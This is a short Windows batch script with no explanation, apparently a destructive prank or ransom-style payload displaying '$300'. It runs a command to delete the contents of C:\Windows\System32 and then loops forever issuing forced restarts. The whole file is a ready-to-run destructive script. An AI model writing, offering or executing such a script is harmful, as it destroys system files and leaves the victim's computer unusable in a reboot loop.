@echo off
title $300
color 4F
pause
del C:\Windows\System32
echo $300
pause
:died
shutdown -r -c "$300"
goto :died